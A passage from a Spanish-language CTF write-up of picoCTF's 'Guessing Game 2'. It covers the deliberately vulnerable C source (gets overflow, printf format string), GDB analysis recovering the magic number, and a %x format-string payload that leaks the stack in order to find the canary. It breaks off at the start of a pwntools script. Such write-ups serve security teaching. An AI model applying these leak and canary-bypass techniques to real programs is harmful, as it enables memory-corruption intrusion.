<!doctype html><html lang=es><head><title>Guessing Game 2 | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Se nos proporciona un binario de 32 bits llamado vuln:
Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir un número, compararlo con otro aleatorio y si es el mismo, solicitar un nombre para mostrar un mensaje:
#include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> #define BUFSIZE 512 long get_random() { return rand; } int get_version() { return 2; } int do_stuff() { long ans = (get_random() % 4096) + 1; int res = 0; printf(&#34;"><meta name=robots content="index, follow"><meta name=image content="https://7rocky.github.io/images/pwn.png"><meta name=author content="7Rocky"><meta property="og:title" content="Guessing Game 2"><meta property="og:description" content="Se nos proporciona un binario de 32 bits llamado vuln:
Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir un número, compararlo con otro aleatorio y si es el mismo, solicitar un nombre para mostrar un mensaje:
#include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> #define BUFSIZE 512 long get_random() { return rand; } int get_version() { return 2; } int do_stuff() { long ans = (get_random() % 4096) + 1; int res = 0; printf(&#34;"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/ctf/picoctf/binary-exploitation/guessing-game-2/"><meta property="article:section" content="ctf"><meta property="article:modified_time" content="2022-03-14T15:12:32+01:00"><meta property="og:site_name" content="7Rocky"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:author" content="7Rocky"><meta itemprop=name content="Guessing Game 2"><meta itemprop=description content="Se nos proporciona un binario de 32 bits llamado vuln:
Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir un número, compararlo con otro aleatorio y si es el mismo, solicitar un nombre para mostrar un mensaje:
#include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> #define BUFSIZE 512 long get_random() { return rand; } int get_version() { return 2; } int do_stuff() { long ans = (get_random() % 4096) + 1; int res = 0; printf(&#34;"><meta itemprop=dateModified content="2022-03-14T15:12:32+01:00"><meta itemprop=wordCount content="2248"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Guessing Game 2"><meta name=twitter:description content="Se nos proporciona un binario de 32 bits llamado vuln:
Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir un número, compararlo con otro aleatorio y si es el mismo, solicitar un nombre para mostrar un mensaje:
#include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> #define BUFSIZE 512 long get_random() { return rand; } int get_version() { return 2; } int do_stuff() { long ans = (get_random() % 4096) + 1; int res = 0; printf(&#34;"><meta name=twitter:image content="https://7rocky.github.io/images/pwn.png"><meta name=twitter:author content="7Rocky"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><script src=/js/main.js></script><div style=display:none>$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/ctf/picoctf/binary-exploitation/guessing-game-2/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">EXPLOTACIÓN DE BINARIOS</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/picoctf/binary-exploitation/guessing-game-2/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/picoctf/binary-exploitation/guessing-game-2/&text=Guessing%20Game%202" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/picoctf/binary-exploitation/guessing-game-2/&title=Guessing%20Game%202" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Guessing Game 2</h1><br></header><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 32 bits llamado <code>vuln</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Arch:     i386-32-little
RELRO:    <span class=code-dark-green>Full RELRO</span>
Stack:    <span class=code-dark-green>Canary found</span>
NX:       <span class=code-dark-green>NX enabled</span>
PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>  
</code></pre></div><p>Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir un número, compararlo con otro aleatorio y si es el mismo, solicitar un nombre para mostrar un mensaje:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;stdlib.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;unistd.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;sys/types.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;sys/stat.h&gt;</span>

<span class=mtk5>#define</span> <span class=mtk8>BUFSIZE</span> <span class=mtk6>512</span>


<span class="mtk7 mtki">long</span> <span class=mtk8>get_random</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class=mtk5>return</span> <span class=mtk1>rand;</span>
<span class=mtk1>}</span>

<span class="mtk7 mtki">int</span> <span class=mtk8>get_version</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class=mtk5>return</span> <span class=mtk6>2</span><span class=mtk1>;</span>
<span class=mtk1>}</span>

<span class="mtk7 mtki">int</span> <span class=mtk8>do_stuff</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">long</span> <span class=mtk1>ans</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk8>get_random</span><span class=mtk1>()</span> <span class=mtk5>%</span> <span class=mtk6>4096</span><span class=mtk1>)</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>res</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>

  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"What</span> <span class=mtk4>number</span> <span class=mtk4>would</span> <span class=mtk4>you</span> <span class=mtk4>like</span> <span class=mtk4>to</span> <span class=mtk4>guess?</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>);</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>guess[BUFSIZE];</span>
  <span class=mtk8>fgets</span><span class=mtk1>(guess,</span> <span class=mtk1>BUFSIZE,</span> <span class=mtk1>stdin);</span>

  <span class="mtk7 mtki">long</span> <span class=mtk1>g</span> <span class=mtk5>=</span> <span class=mtk8>atol</span><span class=mtk1>(guess);</span>

  <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk5>!</span><span class=mtk1>g)</span> <span class=mtk1>{</span>
    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"That's</span> <span class=mtk4>not</span> <span class=mtk4>a</span> <span class=mtk4>valid</span> <span class=mtk4>number!</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
    <span class=mtk5>if</span> <span class=mtk1>(g</span> <span class=mtk5>==</span> <span class=mtk1>ans)</span> <span class=mtk1>{</span>
      <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Congrats!</span> <span class=mtk4>You</span> <span class=mtk4>win!</span> <span class=mtk4>Your</span> <span class=mtk4>prize</span> <span class=mtk4>is</span> <span class=mtk4>this</span> <span class=mtk4>print</span> <span class=mtk4>statement!</span><span class=mtk6>\n\n</span><span class=mtk4>"</span><span class=mtk1>);</span>  
      <span class=mtk1>res</span> <span class=mtk5>=</span> <span class=mtk6>1</span><span class=mtk1>;</span>
    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
      <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Nope!</span><span class=mtk6>\n\n</span><span class=mtk4>"</span><span class=mtk1>);</span>
    <span class=mtk1>}</span>
  <span class=mtk1>}</span>

  <span class=mtk5>return</span> <span class=mtk1>res;</span>
<span class=mtk1>}</span>

<span class="mtk7 mtki">void</span> <span class=mtk8>win</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>winner[BUFSIZE];</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"New</span> <span class=mtk4>winner!</span><span class=mtk6>\n</span><span class=mtk4>Name?</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk8>gets</span><span class=mtk1>(winner);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Congrats:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk8>printf</span><span class=mtk1>(winner);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>\n\n</span><span class=mtk4>"</span><span class=mtk1>);</span>
<span class=mtk1>}</span>

<span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class=mtk8>setvbuf</span><span class=mtk1>(stdout,</span> <span class=mtk6>NULL</span><span class=mtk1>,</span> <span class=mtk1>_IONBF,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk3>//</span> <span class=mtk3>Set</span> <span class=mtk3>the</span> <span class=mtk3>gid</span> <span class=mtk3>to</span> <span class=mtk3>the</span> <span class=mtk3>effective</span> <span class=mtk3>gid</span>
  <span class=mtk3>//</span> <span class=mtk3>this</span> <span class=mtk3>prevents</span> <span class=mtk3>/bin/sh</span> <span class=mtk3>from</span> <span class=mtk3>dropping</span> <span class=mtk3>the</span> <span class=mtk3>privileges</span>
  <span class="mtk7 mtki">gid_t</span> <span class=mtk1>gid</span> <span class=mtk5>=</span> <span class=mtk8>getegid</span><span class=mtk1>();</span>
  <span class=mtk8>setresgid</span><span class=mtk1>(gid,</span> <span class=mtk1>gid,</span> <span class=mtk1>gid);</span>

  <span class="mtk7 mtki">int</span> <span class=mtk1>res;</span>

  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Welcome</span> <span class=mtk4>to</span> <span class=mtk4>my</span> <span class=mtk4>guessing</span> <span class=mtk4>game!</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Version:</span> <span class=mtk6>%x\n\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk8>get_version</span><span class=mtk1>());</span>

  <span class=mtk5>while</span> <span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk1>res</span> <span class=mtk5>=</span> <span class=mtk8>do_stuff</span><span class=mtk1>();</span>
    <span class=mtk5>if</span> <span class=mtk1>(res)</span> <span class=mtk1>{</span>
      <span class=mtk8>win</span><span class=mtk1>();</span>
    <span class=mtk1>}</span>
  <span class=mtk1>}</span>

  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>El código es muy similar al que aparece en el reto <a href=../guessing-game-1>Guessing Game 1</a> (se aconseja mirarlo antes de continuar).</p><p>La función <code>get_random</code> es algo diferente. Ahora toma un valor fijo, pero no sabemos cuál es aún. Sin embargo, podemos verlo en GDB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q vuln
Reading symbols from <span class=code-dark-green>vuln</span>...
(No debugging symbols found in <span class=code-dark-green>vuln</span>)
<span class=code-red>gef➤</span>  disassemble do_stuff
Dump of assembler code for function do_stuff:
   ...
   <span class=code-dark-blue>0x080486e9</span> <+138>:   call   <span class=code-dark-blue>0x80484e0</span> <<span class=code-dark-yellow>atol@plt</span>>
   <span class=code-dark-blue>0x080486ee</span> <+143>:   add    esp,0x10
   <span class=code-dark-blue>0x080486f1</span> <+146>:   mov    DWORD PTR [ebp-0x210],eax  
   <span class=code-dark-blue>0x080486f7</span> <+152>:   cmp    DWORD PTR [ebp-0x210],0x0
   <span class=code-dark-blue>0x080486fe</span> <+159>:   jne    <span class=code-dark-blue>0x8048714</span> <<span class=code-dark-yellow>do_stuff</span>+181>
   <span class=code-dark-blue>0x08048700</span> <+161>:   sub    esp,0xc
   <span class=code-dark-blue>0x08048703</span> <+164>:   lea    eax,[ebx-0x1657]
   <span class=code-dark-blue>0x08048709</span> <+170>:   push   eax
   <span class=code-dark-blue>0x0804870a</span> <+171>:   call   <span class=code-dark-blue>0x80484c0</span> <<span class=code-dark-yellow>puts@plt</span>>
   <span class=code-dark-blue>0x0804870f</span> <+176>:   add    esp,0x10
   <span class=code-dark-blue>0x08048712</span> <+179>:   jmp    <span class=code-dark-blue>0x8048752</span> <<span class=code-dark-yellow>do_stuff</span>+243>
   <span class=code-dark-blue>0x08048714</span> <+181>:   mov    eax,DWORD PTR [ebp-0x210]
   <span class=code-dark-blue>0x0804871a</span> <+187>:   cmp    eax,DWORD PTR [ebp-0x214]
   <span class=code-dark-blue>0x08048720</span> <+193>:   jne    <span class=code-dark-blue>0x8048740</span> <<span class=code-dark-yellow>do_stuff</span>+225>
   ...
End of assembler dump.
</code></pre></div><p>La comparación se encuentra en la dirección <code>0x0804871a</code>, donde se compara <code>$eax</code> con el valor almacenado en <code>$ebp - 0x214</code>. Ponemos un <em>breakpoint</em> aquí y ejecutamos el programa:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-red>gef➤</span>  break *0x0804871a
Breakpoint 1 at <span class=code-dark-blue>0x804871a</span>
<span class=code-red>gef➤</span>  run
Starting program: ./vuln
Welcome to my guessing game!
Version: 2

What number would you like to guess?
1

Breakpoint 1, <span class=code-dark-blue>0x0804871a</span> in <span class=code-dark-yellow>do_stuff</span> ()  
</code></pre></div><p>Perfecto, ahora podemos visualizar el contenido de la dirección <code>$ebp - 0x214</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x $ebp-0x214
<span class=code-dark-blue>0xffffd5f4</span>:     0xfffff2a1  
</code></pre></div><p>Aquí tenemos que darnos cuenta de que <code>0xfffff2a1</code> es un número negativo, ya que el bit más significativo es 1. Por tanto, necesitamos calcular el complemento a dos (negar el número y sumarle 1), que es -3423:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>number</span> <span class=mtk5>=</span> <span class=mtk5>-</span> <span class=mtk1>((</span><span class=mtk5>~</span><span class="mtk7 mtki">0x</span><span class=mtk6>fffff2a1</span> <span class=mtk5>&amp;</span> <span class="mtk7 mtki">0x</span><span class=mtk6>ffffffff</span><span class=mtk1>)</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span>  <span class=mtk3>#</span> <span class=mtk3>-3423</span>  
</code></pre></div><p>Y podemos probarlo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./vuln</span>
Welcome to my guessing game!
Version: 2

What number would you like to guess?
-3423
Congrats! You win! Your prize is this print statement!  

New winner!
Name?
</code></pre></div><p>Ahora llegamos a la función <code>win</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>win</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>winner[BUFSIZE];</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"New</span> <span class=mtk4>winner!</span><span class=mtk6>\n</span><span class=mtk4>Name?</span> <span class=mtk4>"</span><span class=mtk1>);</span>  
  <span class=mtk8>gets</span><span class=mtk1>(winner);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Congrats:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk8>printf</span><span class=mtk1>(winner);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>\n\n</span><span class=mtk4>"</span><span class=mtk1>);</span>
<span class=mtk1>}</span>
</code></pre></div><p>Esta vez tenemos una llamada a <code>gets</code> (que es vulnerable a <em>Buffer Overflow</em>), y también una vulnerabilidad de <em>Format String</em>, ya que la variable winner se inserta como primer argumento en <code>printf</code>.</p><p>Básicamente, podemos extraer valores de la pila (<em>stack</em>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./vuln</span>
Welcome to my guessing game!
Version: 2

What number would you like to guess?
-3423
Congrats! You win! Your prize is this print statement!

New winner!
Name? %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Congrats: 200.f7fae580.804877d.1.fffff2a1.fffff2a1.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.f7ff7500.  

What number would you like to guess?
</code></pre></div><p>La vulnerabilidad de <em>Format String</em> será útil para obtener el valor del <em>stack canary</em> (esta vez sí que hay un <em>stack canary</em>, no como en el reto <a href=../guessing-game-1>Guessing Game 1</a>). Para explotar el <em>Buffer Overflow</em> con <code>gets</code> necesitamos añadir el valor del canario antes de <code>$eip</code> para burlar la protección (si no, el canario se verá modificado y el programa terminará).</p><p>Utilicemos un <em>script</em> en Python para adivinar la posición del canario en la pila. La idea es extraer posiciones de la pila hasta que encontremos un valor que tenga la apariencia de un <em>stack canary</em> (termina en byte nulo, <code>00</code> en hexadecimal):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>

<span class="mtk8 mtku">elf</span> <span class=mtk5>=</span> <span class="mtk8 mtku">ELF</span><span class=mtk1>(</span><span class=mtk4>'vuln'</span><span class=mtk1>,</span> <span class="mtk9 mtki">checksec</span><span class=mtk5>=</span><span class=mtk6>False</span><span class=mtk1>)</span>
<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span> <span class=mtk5>=</span> <span class="mtk8 mtku">elf</span>

